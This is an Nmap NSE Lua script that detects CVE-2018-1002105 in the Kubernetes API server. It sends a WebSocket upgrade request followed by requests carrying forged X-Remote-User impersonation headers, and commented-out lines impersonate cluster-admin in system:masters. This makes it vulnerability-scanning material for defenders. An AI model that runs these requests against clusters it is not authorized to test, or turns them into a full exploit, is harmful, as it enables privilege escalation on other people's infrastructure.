local http = require 'http'
local shortport = require 'shortport'
local stdnse = require 'stdnse'
local string = require 'string'
local vulns = require 'vulns'

description = [[
In all Kubernetes versions prior to v1.10.11, v1.11.5, and v1.12.3, incorrect handling of error responses
to proxied upgrade requests in the kube-apiserver allow specially crafted requests to establish a connection
through the Kubernetes API server to backend servers, then send arbitrary requests over the same connection
directly to the backend, authenticated with the Kubernetes API server's TLS credentials used to establish
the backend connection.

References:
* https://www.twistlock.com/labs-blog/demystifying-kubernetes-cve-2018-1002105-dead-simple-exploit/
]]

author = 'Kostas Milonas'
license = 'Same as Nmap--See https://nmap.org/book/man-legal.html'
categories = {'vuln', 'safe'}

---
-- @usage
-- nmap -p <port> --script http-vuln-cve2018-1002105 <target>
-- nmap -p <port> --script http-vuln-cve2018-1002105 --script-args extension=metrics.k8s.io,version=v1beta1,service=pods <target>
--
-- @output
-- PORT    STATE SERVICE REASON
-- 443/tcp open  https   syn-ack
-- | http-vuln-cve2018-1002105:
-- |   VULNERABLE:
-- |   Kubernetes API Server Remote Privilege Escalation Vulnerability
-- |     State: VULNERABLE
-- |     IDs: CVE:CVE-2018-1002105
-- |     Risk factor: Critical  CVSSv3: 9.8 (CRITICAL) (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
-- |       In all Kubernetes versions prior to v1.10.11, v1.11.5, and v1.12.3, incorrect handling of error responses
-- |       to proxied upgrade requests in the kube-apiserver allow specially crafted requests to establish a connection
-- |       through the Kubernetes API server to backend servers, then send arbitrary requests over the same connection
-- |       directly to the backend, authenticated with the Kubernetes API server's TLS credentials used to establish
-- |       the backend connection.
-- |
-- |     Disclosure date: 2018-12-05
-- |     References:
-- |_      https://www.twistlock.com/labs-blog/demystifying-kubernetes-cve-2018-1002105-dead-simple-exploit/
--
-- @xmloutput
-- <table key="CVE-2018-1002105">
-- <elem key="title">Kubernetes API Server Remote Privilege Escalation Vulnerability</elem>
-- <elem key="state">VULNERABLE</elem>
-- <table key="ids">
-- <elem>CVE:CVE-2018-1002105</elem>
-- </table>
-- <table key="scores">
-- <elem key="CVSSv3">9.8 (CRITICAL) (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)</elem>
-- </table>
-- <table key="description">
-- <elem>
-- In all Kubernetes versions prior to v1.10.11, v1.11.5, and v1.12.3, incorrect handling of error responses
-- to proxied upgrade requests in the kube-apiserver allow specially crafted requests to establish a connection
-- through the Kubernetes API server to backend servers, then send arbitrary requests over the same connection
-- directly to the backend, authenticated with the Kubernetes API server's TLS credentials used to establish
-- </elem>
-- </table>
-- <table key="dates">
-- <table key="disclosure">
-- <elem key="day">05</elem>
-- <elem key="month">12</elem>
-- <elem key="year">2018</elem>
-- </table>
-- </table>
-- <elem key="disclosure">2018-12-05</elem>
-- <table key="refs">
-- <elem>https://www.twistlock.com/labs-blog/demystifying-kubernetes-cve-2018-1002105-dead-simple-exploit/</elem>
-- </table>
-- </table>
-- @args http-vuln-cve2018-1002105.extension The Kubernetes extension API to use.
-- @args http-vuln-cve2018-1002105.version The extension API version.
-- @args http-vuln-cve2018-1002105.service The extension API resource to use.
---

portrule = shortport.http

action = function(host, port)
  local extension = stdnse.get_script_args(SCRIPT_NAME .. '.extension') or 'metrics.k8s.io'
  local version = stdnse.get_script_args(SCRIPT_NAME .. '.version') or 'v1beta1'
  local service = stdnse.get_script_args(SCRIPT_NAME .. '.service') or 'pods'

  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
  local vuln_table = {
    title = 'Kubernetes API Server Remote Privilege Escalation Vulnerability',
    state = vulns.STATE.NOT_VULN,
    IDS = { CVE = 'CVE-2018-1002105' },
    scores = {
      CVSSv3 = '9.8 (CRITICAL) (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)'
    },
    description = [[
In all Kubernetes versions prior to v1.10.11, v1.11.5, and v1.12.3, incorrect handling of error responses
to proxied upgrade requests in the kube-apiserver allow specially crafted requests to establish a connection
through the Kubernetes API server to backend servers, then send arbitrary requests over the same connection
directly to the backend, authenticated with the Kubernetes API server's TLS credentials used to establish
the backend connection.
    ]],
    references = {
      'https://www.twistlock.com/labs-blog/demystifying-kubernetes-cve-2018-1002105-dead-simple-exploit/'
    },
    dates = {
      disclosure = { year = '2018', month = '12', day = '05' }
    }
  }

  -- http client options
  local options = { redirect_ok = false, no_cache = true, no_cache_body = true, bypass_cache = true }

  -- prepare headers for request to backend
  -- local headers = {['Host'] = host.ip, ['User-Agent'] = 'kubectl/v1.12.0 (linux/amd64) kubernetes/0ed3388', ['X-Remote-User'] = 'cluster-admin', ['X-Remote-Group'] = 'system:masters', ['X-Remote-Group'] = 'system:authenticated'}
  local headers = {['Host'] = host.ip, ['User-Agent'] = 'kubectl/v1.12.0 (linux/amd64) kubernetes/0ed3388', ['X-Remote-User'] = 'system:serviceaccount:kube-system:horizontal-pod-autoscaler'}
  -- make request to get the auth key
  local response = http.get(host, port, '/apis/' .. extension .. '/' .. version .. '/' .. service, { header = headers }, options)
  if response.body and response.status == 200 then
    stdnse.debug1('Request to backend succeeded.')
    return vuln_report:make_output(vuln_table)
  end
  stdnse.debug1('Request to backend failed (response code: %s)!', response.status)

  -- prepare headers for connection upgrade
  headers = {['Host'] = host.ip, ['Upgrade'] = 'WebSocket', ['Connection'] = 'upgrade', ['User-Agent'] = 'kubectl/v1.12.0 (linux/amd64) kubernetes/0ed3388', ['Accept'] = '*/*'}
  -- make request to get the auth key
  response = http.get(host, port, '/apis/' .. extension .. '/' .. version , { header = headers }, options)
  if not response.body or response.status ~= 200 then
    stdnse.debug1('Upgrade request failed (response code: %s).', response.status)
    return vuln_report:make_output(vuln_table)
  end
  stdnse.debug1('Upgrade request succeeded!')

  -- prepare headers for request to backend
  -- headers = {['Host'] = host.ip, ['User-Agent'] = 'kubectl/v1.12.0 (linux/amd64) kubernetes/0ed3388', ['X-Remote-User'] = 'cluster-admin', ['X-Remote-Group'] = 'system:masters', ['X-Remote-Group'] = 'system:authenticated'}
  headers = {['Host'] = host.ip, ['User-Agent'] = 'kubectl/v1.12.0 (linux/amd64) kubernetes/0ed3388', ['X-Remote-User'] = 'system:serviceaccount:kube-system:horizontal-pod-autoscaler'}
  -- make request to get the auth key
  response = http.get(host, port, '/apis/' .. extension .. '/' .. version .. '/' .. service, { header = headers }, options)
  if not response.body or response.status ~= 200 then
    stdnse.debug1('Request to backend failed (response code: %s).', response.status)
    return vuln_report:make_output(vuln_table)
  end
  stdnse.debug1('Request to backend succeeded!')

  vuln_table.state = vulns.STATE.VULN
  return vuln_report:make_output(vuln_table)
end
